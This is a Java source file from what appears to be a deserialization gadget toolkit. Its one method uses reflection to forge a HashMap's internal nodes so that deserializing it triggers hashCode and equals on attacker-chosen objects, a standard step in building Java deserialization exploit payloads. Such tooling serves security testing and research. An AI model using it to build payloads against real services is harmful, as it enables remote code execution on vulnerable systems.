package dev.silente.javashark.gadget.jdk;

import dev.silente.javashark.utils.ReflectUtils;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;

public class GHashMap {

    public static java.util.HashMap<Object, Object> deserialize2HashCode(Object v1, Object v2 ) throws Exception {
        java.util.HashMap<Object, Object> s = new java.util.HashMap<>();
        ReflectUtils.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectUtils.setFieldValue(s, "table", tbl);
        return s;
    }
}
